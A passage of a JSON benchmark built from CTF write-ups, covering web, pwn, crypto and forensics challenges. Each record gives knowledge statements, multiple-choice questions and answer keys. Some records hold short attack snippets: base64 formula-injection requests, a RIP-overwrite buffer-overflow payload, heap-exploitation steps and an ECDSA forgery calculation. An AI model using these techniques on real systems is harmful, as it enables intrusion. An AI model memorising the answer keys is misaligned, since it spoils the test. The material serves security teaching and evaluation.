            "In a cybersecurity challenge that involves solving a Diophantine equation of the form \\(p^3 + q^3 + r^3 = 1\\), how should one derive the integers \\(p\\), \\(q\\), and \\(r\\) from a single variable \\(b\\) to ensure at least one of these integers is prime? - A. \\(P = 9 \\times (b^2), Q = -3 \\times b - 9 \\times (b^2), R = 1 + 9 \\times (b^2)\\) - B. \\(P = b, Q = b^2, R = b^3\\) - C. \\(P = 9 \\times (b^4), Q = -3 \\times b - 9 \\times (b^4), R = 1 + 9 \\times (b^3)\\) - D. \\(P = 3 \\times (b^3), Q = 3 \\times b + 3 \\times (b^3), R = -1 - 3 \\times (b^2)\\) ",
            "When developing a function to find an integer value of \\(b\\) that generates at least one prime number among \\(p\\), \\(q\\), and \\(r\\) for a challenge with specific bit length requirements, which library function is essential for checking if the generated number is prime? - A. `isdigit()` from the `math` library - B. `factorize()` from the `numpy` library - C. `gcd()` from the `fractions` library - D. `isprime()` from the `sympy` library "
        ],
        "answer": [
            "C",
            "D"
        ]
    },
    {
        "name": "Trading values",
        "write_up": "dataset/raw/Trading values.md",
        "type": "web",
        "competition": [
            "Securinets/2019/Quals",
            "https://ctftime.org/event/769/tasks/"
        ],
        "score": 998,
        "max_score": 1000,
        "difficulty": 0.998,
        "knowledge": [
            "When dealing with web applications that process server-side executed formulas received through client-side requests, a potential attack vector involves encoding custom operations or commands in base64 and sending them as part of the query parameters. This method can be used to probe and exploit server-side parsing or evaluation flaws, leading to unauthorized actions or information disclosure. Example payload: `GET /default?formula=DQoxKzE=&values[v1]=STC&values[v2]=PLA&values[v3]=SDF&values[v4]=OCK`, where `DQoxKzE=` is the base64 encoding of `1+1`.",
            "In scenarios where web applications reveal error messages or server responses based on manipulated input, injecting a payload that forces the application to print or disclose server-side object properties or environment variabies can reveal sensitive information, including security flags or keys. This can be particularly effective in applications using interpreted languages or expression handling libraries. By manipulating the input to reference internal objects or configurations, such as setting a value to \"this\" to inspect the current object or execution context, attackers can unearth valuable data inadvertently exposed by error messages or debug information. Example manipulation: `GET /default?formula=djA=&values[v0]=this&values[v1]=STC&values[v2]=PLA&values[v3]=SDF&values[v4]=OCK`, aiming to print the \"this\" object, with `djA=` being the base64 encoding for `v0`."
        ],
        "question": [
            "In an attack scenario exploiting server-side formula processing vulnerabilities, which of the following payloads, when base64-encoded and sent in a query parameter, could potentially execute a vulnerability probe or exploit by evaluating to 2? - A. `GET /default?formula=MyptMQ==&values[v1]=A&values[v2]=B&values[v3]=C&values[v4]=D` (base64 encoding of `3:-1`) - B. `GET /default?formula=MSox&values[v1]=X&values[v2]=Y&values[v3]=Z&values[v4]=W` (incorrect base64, supposed to be encoding of `1*1`) - C. `GET /default?formula=DQoxKzE=&values[v1]=P&values[v2]=Q&values[v3]=R&values[v4]=S` (base64 encoding of `1+1`) - D. `GET /default?formula=VVRGLThf&values[v1]=M&values[v2]=N&values[v3]=O&values[v4]=P` (base64 of \"UTF-8_\")",
            "When exploring the injection of payloads aiming to extract sensitive information from a web application's server-side processing mechanism, which of the technique below is incorrectly depicted? - A. Injecting a command to print all object properties by setting `values[v0]=this`, where `this` aims to reveal the execution context. - B. Injecting `values[v0]=env` in an attempt to list all environment variables directly, assuming the server-side parser directly accesses global objects. - C. Sending `GET /default?formula=djA=&values[v0]=this&values[v1]=STC&values[v2]=PLA&values[v3]=SDF&values[v4]=OCK` with `djA=` being the base64 encoding for `v0`. - D. Encapsulating the request to target internal server paths or files, such as `/etc/passwd`, assuming the expression parser will interpret filesystem paths."
        ],
        "answer": [
            "C",
            "D"
        ]
    },
    {
        "name": "Traffic Lights A",
        "write_up": "dataset/raw/Traffic Lights A.md",
        "type": "This CTF challenge falls under the category of **miscellaneous (misc)**.",
        "competition": [
            "HSCTF/2020",
            "https://ctftime.org/event/939/tasks/"
        ],
        "score": 486,
        "max_score": 500,
        "difficulty": 0.972,
        "knowledge": [
            "When solving optimization problems in CTF challenges, such as the minimum cost flow problem, leveraging existing algorithms and libraries can significantly save time and effort. For instance, Google's Operations Research tools offer a robust implementation for solving such problems. This approach is beneficial when the problem fits a well-known algorithmic problem, implying that researching and adapting existing code is often more efficient than developing a solution from scratch.",
            "Modifying input/output handling to match the challenge requirements is often necessary when utilizing existing codebases. Specifically, in scenarios where challenges involve network flow or similar optimization problems, adjusting how data is read from input files and how results are output can be critical for solving the challenge. This might involve parsing custom input formats into the structure expected by the algorithm and ensuring correct output formatting to meet challenge submission standards."
        ],
        "question": [
            "When faced with a minimum cost flow problem in a CTF challenge, which of the following statements best reflects a recommended approach? - A. Always start from scratch to ensure the solution is perfectly tailored to the problem. - B. Prefer brute force methods over optimization libraries for greater learning. - C. Use existing algorithm implementations, such as Google's Operations Research tools, to efficiently tackle the problem. - D. Avoid using third-party libraries to prevent dependency issues. ",
            "In the context of adapting existing codebases to solve CTF challenges involving optimization problems, what is a crucial step in modifying the code? - A. Ignoring input/output handling to focus on the optimization logic. - B. Hardcoding data values instead of reading from input files. - C. Adjusting input/output handling to fit the specific challenge requirements, including parsing and formatting. - D. Completely rewriting the provided algorithms to improve execution speed. "
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "Tranquil",
        "write_up": "dataset/raw/Tranquil.md",
        "type": "pwn",
        "competition": [
            "angstrom/2021",
            "https://ctftime.org/event/1265/tasks/"
        ],
        "score": 70,
        "max_score": 300,
        "difficulty": 0.23333333333333334,
        "knowledge": [
            "When encountering a binary with unsafe functions such as `gets()`, buffer overflow attacks can be used to rewrite the instruction pointer (RIP). This is because `gets()` does not check the length of input, allowing an attacker to input a value larger than the buffer intended to hold, thus overwriting adjacent memory areas, including the RIP. The scenario involves identifying the exact buffer size before the memory area, where the RIP is located, to determine the correct number of bytes to input before inserting the address of a function you want to execute.",
            "Identifying the memory address of the function you want to execute (for example, a `win()` function that prints out the flag) can be accomplished using tools like `readelf`. This tool can be invoked with the `-s` flag to list symbols in the binary, allowing an attacker to locate the memory address of specific functions. Once the address is found, it can be appended to the payload in little-endian format to overwrite the RIP correctly and divert the execution flow to the desired function. \n   \nExample payload: python2 -c \"print 'A'*71 + '\\x96\\x11\\x40\\x00'\""
        ],
        "question": [
            "In a buffer overflow vulnerability scenario using the `gets()` function, after finding the buffer size is 64 bytes but causing a segmentation fault at 72 bytes, how is the appropriate amount of data to send determined to overwrite the instruction pointer (RIP) accurately? - A. Send the exact buffer size plus the size of the RIP. - B. Send 64 bytes followed by the address you wish to redirect execution to. - C. Send enough data to fill the buffer and then additional bytes until you overwrite the RIP, which may involve trial and error. - D. Calculate the offset from the start of the buffer to the RIP and send data of this length.",
            "When attempting to overwrite the instruction pointer to execute a specific function (e.g., a `win()` function that prints the flag) in a buffer overflow attack, which tool and flag combination is used to find the memory address of the target function to construct the payload correctly? - A. Use `objdump -D` to disassemble the entire binary and search for the function's memory address. - B. Apply `nm -n` to list symbols and their addresses in numerical order. - C. Employ `gdb` with the `info functions` command to locate the function's starting address. - D. Utilize `readelf -s` to list symbols in the binary, allowing for the location of the target function's memory address."
        ],
        "answer": [
            "C",
            "D"
        ]
    },
    {
        "name": "TrashChain",
        "write_up": "dataset/raw/TrashChain.md",
        "type": "crypto",
        "competition": [
            "DawgCTF/2021",
            "https://ctftime.org/event/1319/tasks/"
        ],
        "score": 250,
        "max_score": 400,
        "difficulty": 0.625,
        "knowledge": [
            "When dealing with custom hashing functions in CTF challenges, especially when the hash involves modular exponentiation, understanding the properties of modulus can lead directly to a solution. If a mathematical operation brings the result of `((n * a + 1) ** b) % a` to 1 regardless of `b`, this can be leverage to make hash values predictable or controlled.",
            "In scenarios where the challenge rules permit manipulating input lengths and values with considerable freedom, constructing specific input sequences based on the mathematical properties of the hash function\u2019s operations can ensure that the output hashes match. For instance, choosing input values for `chain1` and `chain2` such that every operation within the hash function simplifies to a predictable result (like 1) under modulus, can make the final hash values identical.\n   \n   Example payload for such a scenario:\n   ```\n   Chain 1 input: A - 1\n   Chain 2 input: [2A, 2A - 1, 2A - 2, 2A - 4]\n   ```\n   Where `A` is a constant from the hash function, ensuring both chains produce the same hash result under the provided conditions."
        ],
        "question": [
            "When evaluating a custom hashing function that relies on modular exponentiation, understanding the outcome of specific mathematical operations is crucial. Consider the operation `((n * a + 1) ** b) % a` resulting in 1 for any values of `b`, given certain constraints on `a` and `n`. In what situation is this property practically useful in custom hash functions encountered in CTFs?  - A. To ensure all hash outputs are unique and cannot be controlled. - B. To design hash functions that require brute force for pre-image attacks. - C. To make hash values predictable or controlled by simplifying the hash computation to a predictable result. - D. To increase the complexity and cryptographic strength of the hash function. ",
            "In a challenge that allows manipulating input sequences and their lengths to influence hash outputs, constructing specific input values based on the mathematical properties of the hash function\u2019s operations can yield predictable results. Given a hash function that operates under the modulus with a constant `A`, and specific conditions for input sequences `chain1` and `chain2`, which set of input values ensures that both chains produce identical hash results under the challenge conditions?  - A. Chain 1 input: `A + 1`, Chain 2 input: `[A, A + 1, A + 2, A + 3]` - B. Chain 1 input: `A - 1`, Chain 2 input: `[2A, 2A - 1, 2A - 2, 2A - 3]` - C. Chain 1 input: `1`, Chain 2 input: `[2, 3, 4, 5]` - D. Chain 1 input: `A - 1`, Chain 2 input: `[2A, 2A - 1, 2A - 2, 2A - 4]` "
        ],
        "answer": [
            "C",
            "D"
        ]
    },
    {
        "name": "Trashy Or Classy",
        "write_up": "dataset/raw/Trashy Or Classy.md",
        "type": "forensics",
        "competition": [
            "ASIS/2018/Quals",
            "https://ctftime.org/event/568/tasks/"
        ],
        "score": 123,
        "max_score": 500,
        "difficulty": 0.246,
        "knowledge": [
            "When analyzing network traffic for forensic purposes, if encountering a pcap file, tools like Wireshark or NetworkMiner can be utilized for a comprehensive analysis, particularly in uncovering HTTP requests and authentication details. This becomes crucial when identifying HTTP directory brute force attacks or extracting sensitive information such as usernames and passwords transmitted in clear text or via simple encoding mechanisms like HTTP Digest Authentication.",
            "For files that seem non-readable or when the file type is unknown, the Linux `file` command can provide initial clues about the file's nature; if this step does not yield sufficient information, additional research based on file extensions or content can guide towards the appropriate tools or methods for extraction. In cases where files are part of a set or system like `casync`, it may be necessary to acquire all related components to successfully extract the intended data, resorting to automation scripts if needed to gather multiple files systematically. \n\nSample automation script snippet for fetching multiple files:\n```python\nimport os\nimport subprocess\n\nwhile True:  \n   command = 'strace ./casync extract --store=./flag.castr ./flag.caidx ./flag/ 2>&1 | grep \"No such file\"'\n   process = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)\n   output, _ = process.communicate()\n\n   if not (\".cacnk\" in str(output)):\n       break\n\n   missing_file = output.decode().split('\"')[1]\n   wget_command = f'wget --user=admin --password=rainbow http://167.99.233.88/private/{missing_file}'\n   os.system(wget_command)\n   # Create directories and move the downloaded file to the appropriate location as per its path in the strace output\n```\nThis script adapts the principle from the write-up, automating the process of identifying, fetching, and organizing missing files for data extraction tools to function correctly, specifically useful when dealing with distributed file systems or content addressed storage systems."
        ],
        "question": [
            "When examining a pcap file with tools like Wireshark or NetworkMiner to analyze network traffic, what type of sensitive information is crucial to look for in HTTP requests and authentication processes? - A. HTTP Status Codes and Server Response Times - B. User-Agent Strings and Accept Headers - C. Usernames and Passwords in Clear Text or via Digest Authentication - D. Content-Length Headers and MIME Types",
            "What is the initial step a forensic analyst should take when encountering a file with non-readable characters or an unknown file type during an investigation? - A. Immediately attempt to open the file with a hex editor for in-depth binary analysis. - B. Use the Linux `file` command to determine the file's nature based on its contents and metadata. - C. Upload the file to an online service that guesses file types based on file extensions. - D. Decompile the file to source code to understand its functionality."
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "Treecache Alyx",
        "write_up": "dataset/raw/Treecache Alyx.md",
        "type": "pwn",
        "competition": [
            "HSCTF/2020",
            "https://ctftime.org/event/939/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "To exploit use-after-free vulnerabilities effectively, after identifying an object that can be freed and accessed again, modify its content to control data or function pointers. This technique was applied by freeing `temp_null`, which `root` still pointed to, allowing manipulation of its content which lead to arbitrary write capabilities.\n   - Example payload step: Free an object, then allocate a similarly sized object and write into it to control the previous object's content.",
            "To leak libc addresses and bypass the need for a leak function, manipulate the heap in such a way that malloc returns a pointer that contains a libc address, such as by populating the tcache with chunks and forcing a chunk onto the smallbin freelist. This resulted in a controlled chunk containing a libc pointer which could then be leaked through normal program output.\n   - Example payload step: Fill tcache with chunks, force an additional chunk onto smallbin freelist, then manipulate allocations to leak the libc address through program-controlled output."
        ],
        "question": [
            "In an exploitation scenario involving a use-after-free vulnerability, assuming there is an object `obj` that can be freed and still accessed later, which of the following methods is effective for exploiting such vulnerability? - A. Allocate a new object of a different size, to prevent memory reuse. - B. Immediately exit the program after freeing the object, ensuring data integrity. - C. Free the object `obj`, then allocate a similarly sized object and modify its content to control the original `obj`'s content. - D. Increase memory usage to trigger garbage collection and clear the freed object's memory. ",
            "During a heap exploitation challenge, you aim to leak libc addresses without a direct leak function. Given you can control heap allocations and deallocations, which of the following strategies would allow you to leverage a malloc first-fit behaviour to leak a libc address? - A. Fill the stack with pointers to divert any libc leaks to controlled memory regions. - B. Spawn multiple threads to increase the likelihood of race conditions, allowing a leak via a timing attack. - C. Populate the tcache with chunks, then force an additional chunk onto the smallbin freelist and manipulate future allocations to have a controlled chunk containing a libc address. - D. Continuously allocate and deallocate large objects to trigger an out-of-memory condition, causing the program to dump memory contents. "
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "Tricky Bit",
        "write_up": "dataset/raw/Tricky Bit.md",
        "type": "forensics",
        "competition": [
            "DarkCTF/2020",
            "https://ctftime.org/event/1118/tasks/"
        ],
        "score": 475,
        "max_score": 499,
        "difficulty": 0.9519038076152304,
        "knowledge": [
            "In challenges involving steganography where text is hidden within an image file by altering the least significant bit (LSB) of each byte, the extraction process involves reading the image file, skipping the header bytes, and then extracting the LSB from each byte following the header. This extracted sequence of bits is then reassembled into bytes and converted back into characters to reveal the hidden message. Such techniques can be applied to images where textual information is concealed using LSB steganography. Example steps for extraction include reading the image file excluding header bytes, converting each byte to binary, extracting the LSB, and grouping every 8 LSBs to convert back to characters.",
            "The usage of a delimiter within the hidden text serves as a mechanism to indicate the end of a message or, in this context, the length of the hidden message. This approach is beneficial when the hidden message's size is unknown or needs to be dynamically determined. Implementing a delimiter allows for the extraction process to reliably identify the end of the hidden message, thereby enabling precise extraction without extraneous data. When implementing or reversing steganographic techniques that involve hidden text of variable length, incorporate a unique delimiter to demarcate the message or its size. Example implementation includes appending a delimiter to the hidden message before encoding and checking for this delimiter during decoding to determine when the entire message has been reliably extracted."
        ],
        "question": [
            "In a steganography challenge where the LSB (Least Significant Bit) technique is used for hiding text within an image, the process for extracting this hidden text requires several steps. Given that the text is embedded in the image following the 54-byte header, which of the following processes accurately describes the correct method to reveal the hidden text? - A. Extract the MSB (Most Significant Bit) from each byte of the image data after the header and reassemble them into characters. - B. Directly convert each byte into characters without any manipulation to uncover the hidden message. - C. Skip the header bytes, then for each subsequent byte, convert it to binary, extract the LSB, and group every 8 LSBs to convert them back into characters. - D. Take the first byte following the header as is, interpreting it directly as ASCII to reveal the hidden text.",
            "When implementing a method to hide and then subsequently retrieve text within an image using LSB steganography, the use of a delimiter is crucial for determining the end or the length of the hidden message. In this context, how does the delimiter function within the extraction process to accurately identify the conclusion of the hidden text? - A. The delimiter is used to replace every LSB in the image, making the hidden text readable without conversion. - B. The delimiter acts as a separator between each character of the hidden text, requiring it to be removed to reveal the message. - C. The hidden text is embedded without alteration, and the delimiter is simply appended at the start of the image file. - D. Upon encountering the delimiter during the extraction process, it indicates the end of the length count or actual message, thereby guiding the extraction process to cease reading further for hidden text."
        ],
        "answer": [
            "C",
            "D"
        ]
    },
    {
        "name": "TRIPLE",
        "write_up": "dataset/raw/TRIPLE.md",
        "type": "crypto",
        "competition": [
            "Securinets/2020/Quals",
            "https://ctftime.org/event/1016/tasks/"
        ],
        "score": 993,
        "max_score": 1000,
        "difficulty": 0.993,
        "knowledge": [
            "When analyzing a binary file that seems to perform encryption operations, and there is evidence of block processing (e.g., consistent output sizes regardless of small input variations), consider the possibility of block cipher usage. The size of the output block (e.g., 8 bytes in this challenge) provides a clue to the specific block cipher or mode being used. This knowledge is crucial for determining the appropriate approach to decrypt or manipulate the cipher if necessary.",
            "Upon identifying the potential use of a known encryption algorithm (like 3DES in this scenario) through constants or patterns within the binary (for instance, specific key or block sizes), leverage existing cryptographic tools and libraries (such as PyCryptoDome's `Crypto.Cipher.DES3`) for decryption. The process involves converting hex or binary key and cipher text files into a usable format (e.g., removing new lines, converting to hexadecimal, and then to bytes) before decryption. This approach is applicable when keys and ciphertexts are provided or can be extracted, and the encryption algorithm is known or can be guessed.\n   \n   Sample of payload implementation for decryption using Python:\n   ```python\n   from Crypto.Cipher import DES3\n   from binascii import unhexlify\n\n   # Read key, remove newline, convert from binary to hex, then to bytes\n   with open('key.txt') as f:\n       key = int(f.read().strip(), 2)\n       key = unhexlify(hex(key)[2:].zfill(48))  # Ensure key length fits\n\n   # Read cipher, convert from binary to hex, then to bytes\n   with open('cipher.txt') as f:\n       cipher = int(f.read(), 2)\n       cipher = unhexlify(hex(cipher)[2:].zfill(64))  # Adjust for proper padding\n\n   des3 = DES3.new(key, DES3.MODE_ECB)\n   decrypted = des3.decrypt(cipher)\n   print(decrypted)\n   ```"
        ],
        "question": [
            "When analyzing a binary file, you notice that the output size remains consistent despite varying the input size slightly, suggesting the possibility of block cipher usage. What does the consistency in output size (e.g., 8 bytes) primarily indicate?  - A. The encryption algorithm is stream-based, and input variations do not impact the output size. - B. The encryption operates in a block cipher mode, processing input data in fixed-size blocks. - C. The binary file is corrupted, resulting in a fixed output size irrespective of the input. - D. The input data is being truncated to match the block size of an underlying hash function. ",
            "You have identified the use of a known encryption algorithm (3DES) within a binary by spotting specific constants and patterns, and you need to decrypt data using `Crypto.Cipher.DES3`. Which step correctly describes the preparation of the encryption key and cipher from provided text files for decryption with 3DES.MODE_ECB?  - A. Directly input the content of the key and cipher text files into the DES3 encryption function without formatting. - B. Encode the key and cipher text contents to ASCII before using them in the DES3 decryption function. - C. Convert the binary content from the key and cipher text files to hexadecimal and then to bytes, trimming any new lines, before decryption. - D. Compress the key and cipher text files to reduce their size before performing decryption with DES3. "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Triplet",
        "write_up": "dataset/raw/Triplet.md",
        "type": "crypto",
        "competition": [
            "Crypto/2021",
            "https://ctftime.org/event/1258/tasks/"
        ],
        "score": 91,
        "max_score": 477,
        "difficulty": 0.19077568134171907,
        "knowledge": [
            "To solve challenges involving RSA public and private exponents shared across multiple moduli, ensure that the Euler's totient function (phi) for one modulus is a multiple of another's. This can be achieved by carefully selecting primes for each modulus so that phi values are multiples of each other. This guarantees that a valid exponent pair (`e`, `d`) for the largest phi will also be valid for the smaller ones. Suitable primes can be generated by multiplying a base prime by a factor and adding one until a prime is found, ensuring the condition on phi values is met.",
            "When needing to generate a valid public and private exponent pair (`e`, `d`) that satisfies the RSA equation `e * d = 1 + k * phi(n)` for a given modulus `n`, where `phi(n)` is known, one can find `e` and `d` by factoring `1 + phi(n)`. Tools like FactorDB can assist in this process. The factored numbers can then be examined to select a pair that fits the requirement, taking into consideration any additional constraints such as the size or value ranges of `e` and `d`."
        ],
        "question": [
            "In a challenge to utilize RSA with multiple moduli sharing the same public and private exponents, a successful strategy involves aligning the Euler's totient function (phi) of these moduli in a specific manner. Which of the following best describes a suitable method for generating primes to ensure one modulus's phi is a multiple of another, fulfilling the RSA condition effectively? - A. Choose primes randomly until they naturally form a sequence where each consecutive phi value is divisible by the previous one without any additional calculation. - B. Generate primes by starting with a base prime and repeatedly adding a non-prime constant, ensuring each new prime leads to a phi that is not related to the others. - C. Select primes by multiplying a base prime by a random factor and adding one, testing for primality each time, to establish a sequence where each phi is a multiple of the previous. - D. Utilize a fixed sequence of known primes regardless of their relation to each other and adjust the RSA algorithm to work with non-relative phi values.",
            "When generating a valid RSA public and private exponent pair (`e`, `d`) for a given modulus where the RSA equation is `e * d = 1 + k * phi(n)`, and knowing `phi(n)`, which strategy correctly identifies a method to find such a pair? - A. Arbitrarily choose any prime numbers for `e` and `d` without considering `phi(n)`, as all primes naturally satisfy the RSA equation. - B. Compute `e` and `d` directly from `phi(n)` through simple algebraic operations like addition or subtraction, ignoring the modular aspect of the equation. - C. Use a sophisticated algorithm that does not require knowledge of `phi(n)`, relying instead on guessing and checking until a pair that satisfies the equation is found. - D. Factor `1 + phi(n)` to find components that could serve as `e` and `d`, utilizing external tools like FactorDB for the factoring process, thereby ensuring they meet the specified RSA equation and additional constraints."
        ],
        "answer": [
            "C.",
            "D."
        ]
    },
    {
        "name": "Trivia 1",
        "write_up": "dataset/raw/Trivia 1.md",
        "type": "misc",
        "competition": [
            "BSidesSF/2019",
            "https://ctftime.org/event/753/tasks/"
        ],
        "score": 2,
        "max_score": 666,
        "difficulty": 0.003003003003003003,
        "knowledge": [
            "Knowledge of cultural or historical references can be useful in CTF challenges, especially in trivia or miscellaneous categories. Understanding these references can provide insights or direct answers to the challenges. For example, knowing key phrases or quotes from movies, books, or history that are related to technology or cybersecurity can be directly used to solve puzzles.",
            "Knowledge of key figures and their contributions to the field of computer science or cybersecurity is important. This can include knowing the creators of significant tools, operating systems, or algorithms. For instance, knowing who created Linux can be the direct answer to trivia questions in CTF competitions."
        ],
        "question": [
            "In a cybersecurity related trivia question, an understanding of popular culture and notable quotes can be crucial. Consider this scenario from a challenge: The prompt is to complete a sentence relating to identity verification that references a famous movie. If the sentence starts with \"My voice is my ________. Verify me.\" and hints at a 1992 film, which word correctly completes the sentence based on a well-known movie quote? - A. Signature - B. Password - C. Passport - D. Handshake",
            "During a trivia challenge focusing on the history of computing, participants are asked about the origins of significant technologies. One question requires identifying the creator of a widely used operating system. Based on your knowledge, who is recognized as the creator of Linux, a pivotal figure in computer science? - A. Bill Gates - B. Steve Jobs - C. Linus Torvalds - D. Tim Berners-Lee"
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "Trunc",
        "write_up": "dataset/raw/Trunc.md",
        "type": "crypto",
        "competition": [
            "ASIS/2019/Finals",
            "https://ctftime.org/event/805/tasks/"
        ],
        "score": -1.0,
        "max_score": 477,
        "difficulty": -1,
        "knowledge": [
            "In challenges involving ECDSA-based signature schemes where nonce generation is biased or predictable, signatures for a known message can be manipulated to forge signatures for another message by exploiting the relationship between message hashes and signature components. If \\(h_1\\) is the hash of any chosen message \\(m_1\\), \\(h_2\\) is the hash for a target message \\(m_2\\), and \\((u_1, v_1, s_1)\\) is a valid signature for \\(h_1\\), then a valid signature for \\(h_2\\) can be crafted as \\((u_1, v_1m, s_1m)\\) where \\(m = h_2 \\cdot h_1^{-1} \\mod n\\). This technique is applicable under conditions where nonce-related weaknesses in the signature generation process exist.",
            "For the ECDSA signature scheme, when tasked with forging a signature for a specific message without directly signing it, first find a message \\(m_1\\) that you can sign, calculate its hash \\(h_1\\), and do the same for the target message \\(m_2\\) to obtain \\(h_2\\). Compute the multiplier as \\(m = h_2 \\cdot h_1^{-1} \\mod n\\), where \\(n\\) is the curve order. If \\((u_1, v_1, s_1)\\) is the signature for \\(m_1\\), the signature \\((u_1, v_1 \\cdot m \\mod n, s_1 \\cdot m \\mod n)\\) will validate for \\(m_2\\). This knowledge allows exploitation of nonce reuse or predictability issues in ECDSA without requiring direct access to the private key or nonce.\n\nExample payload to manipulate signatures based on explained vulnerability:\n```python\n# Python snippet to calculate forged signature components for the target message\nn = SECP256k1.order\nh1 = int(sha256(b'your_message').hexdigest(), 16)\nh2 = int(sha256(b'target_message').hexdigest(), 16)\nm = h2 * pow(h1, -1, n) % n  # Computing the multiplier\nu2, v2, w2 = u1, v1 * m % n, w1 * m % n  # Forging the signature for the target message\n```\nThis snippet assumes you have a valid signature \\((u1, v1, w1)\\) for your chosen message and calculates the necessary components to forge a signature for the target message using the calculated multiplier \\(m\\)."
        ],
        "question": [
            "In the given scenario, the signature scheme allows for manipulation due to predictable nonce generation. Given the hash of an arbitrary message \\(h_1\\) and the hash of a target message \\(h_2\\), alongside a valid signature \\((u_1, v_1, s_1)\\) for \\(h_1\\), which formula correctly describes the method to forge a signature \\((u, v, s)\\) for \\(h_2\\)? - A. \\((u_1, v_1 + m, s_1 + m)\\) where \\(m = h_2 * h_1^{-1} \\mod n\\) - B. \\((u_1, v_1 * m \\mod n, s_1 * m \\mod n)\\) where \\(m = h_2 * h_1^{-1} \\mod n\\) - C. \\((u_1 + m, v_1 + m, s_1 + m)\\) where \\(m = h_2 + h_1^{-1} \\mod n\\) - D. \\((u_1 * m \\mod n, v_1 \\mod n, s_1 \\mod n)\\) where \\(m = h_2 + h_1 \\mod n\\)",
            "To leverage nonce predictability in ECDSA for forging a signature on a target message without direct access to the private key, what is the initial step before calculating the forged signature components using \\((u_1, v_1 \\cdot m \\mod n, s_1 \\cdot m \\mod n)\\)? - A. Choose a target message and obtain its public key. - B. Select a message, sign it, and compute the hash of both the chosen and target message. - C. Hack the elliptic curve system to find the private key. - D. Guess the nonce used in the signature process."
        ],
        "answer": [
            "B",
            "B"
        ]
    },
    {
        "name": "Truncated form",
        "write_up": "dataset/raw/Truncated form.md",
        "type": "crypto",
        "competition": [
            "ASIS/2019/Finals",
            "https://ctftime.org/event/805/tasks/"
        ],
        "score": 208,
        "max_score": 477,
        "difficulty": 0.4360587002096436,
        "knowledge": [
            "In challenges involving prime manipulation and transformation into a specific format, factorization plays a crucial role. To handle large numbers efficiently, factor the prime number with an increment (p+i) into its prime constituents, leveraging the prime factors for further manipulation, such as calculating the primorial of a number. This step is critical in reducing the problem to a workable format and eventually finding a concise representation that meets the challenge's requirements.",
            "When tasked with generating a specific output format from a prime number, iterating over a range of numbers to adjust the prime (p+i) can be an effective strategy. This adjustment facilitates factorization and subsequent operations that involve prime numbers and their primorials. Moreover, incorporating condition checks to ensure that resulting expressions or transformations are within a specified length or format criteria can streamline the process of arriving at the correct solution. Implementing a check to compare the length of the result against a target length ensures that the solution not only satisfies the mathematical requirements but also adheres to format constraints imposed by the challenge.\n\nSample Payload/Output Generation Logic:\n```python\nresult = str(a) + \"*\" + str(x) + \"#/\" + str(divisor) + \"-\" + str(i)\nif len(result) <= 29:\n   return result\n```"
        ],
        "question": [
            "In the process of transforming a prime number into a specific string format, why is it necessary to factorize the prime number with an increment (p+i)? - A. To encrypt the prime number before transmitting it securely over a network. - B. To reduce the prime number to a range that can be easily manipulated without factorization. - C. To facilitate the breakdown into prime constituents for further operations like calculating primorials, crucial for the formation of the specific string format. - D. To increase the computational complexity of the algorithm, making it more challenging for unauthorized interception.",
            "When generating a specific string representation from a prime number, how does incorporating a condition to check the length of the resulting string against a target length assist in solving the challenge? - A. It verifies that the encrypted message length matches the expected encryption standard length. - B. It ensures that the solution adheres to format constraints imposed by the challenge, achieving both mathematical requirements and specific length or format criteria. - C. It randomizes the output, adding an additional layer of security to the prime number before it is sent over the network. - D. It filters out any non-prime numbers mistakenly included in the calculations, purifying the dataset."
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "Trusted Cloud 1",
        "write_up": "dataset/raw/Trusted Cloud 1.md",
        "type": "The type of challenge is forensics.",
        "competition": [
            "LedgerDonjon/2021",
            "https://ctftime.org/event/1516/tasks/"
        ],
        "score": 100,
        "max_score": 400,
        "difficulty": 0.25,
        "knowledge": [
            "When analyzing disk images, especially those related to Linux systems, encountering LUKS-encrypted partitions should prompt the inspection of any associated TPM (Trusted Platform Module) network captures for potential decryption keys. The TPM2 protocol, particularly commands like TPM2_CC_Unseal, can contain the decryption key required to access encrypted volumes. To extract the key from network captures, tools like Wireshark can be used to dissect TPM2 protocol communication, identifying the response parameters of the TPM2_CC_Unseal request to obtain the key.",
            "If a decryption key is obtained from TPM2 protocol analysis, it may be encoded in a format such as base64 before being used by system utilities like systemd's cryptsetup for LUKS volume management. Therefore, converting the extracted key to base64 format is essential before attempting to mount and access the encrypted partition. This approach can be particularly effective in scenarios where the system relies on TPM for secure key storage and measured boot processes. \n\n   - **Example of decoding and using the key**: \n     - Extracted key: `0020d57256b7127609a08607f99d6a0b9ff12af45c1c01f7b14322248bfc8072a3d5`\n     - Convert to base64: `echo -n '0020d57256b7127609a08607f99d6a0b9ff12af45c1c01f7b14322248bfc8072a3d5' | xxd -r -p | base64`\n     - The output, which is `1XJWtxJ2CaCGB/mdaguf8Sr0XBwB97FDIiSL/IByo9U=`, would then be used as the passphrase for opening the LUKS volume."
        ],
        "question": [
            "In the context of forensic analysis of a disk image with a partition encrypted by LUKS, when encountering network captures related to TPM, which TPM2 command should you specifically look for to potentially find the decryption key? - A. TPM2_CC_PCR_Read - B. TPM2_CC_Unseal - C. TPM2_CC_Hash - D. TPM2_CC_StartAuthSession",
            "When you have obtained a potential decryption key from TPM2 protocol communication relevant to a LUKS-encrypted partition in a Linux system, which of the following steps is crucial to make the key usable with systemd's cryptsetup tool for mounting the volume? - A. Encrypt the key using SHA-256 - B. Encode the key in ASCII format - C. Encode the key using base64 - D. Compress the key using ZIP compression"
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Trusted Cloud 2",
        "write_up": "dataset/raw/Trusted Cloud 2.md",
        "type": "reverse",
        "competition": [
            "LedgerDonjon/2021",
            "https://ctftime.org/event/1516/tasks/"
        ],
        "score": 200,
        "max_score": 400,
        "difficulty": 0.5,
        "knowledge": [
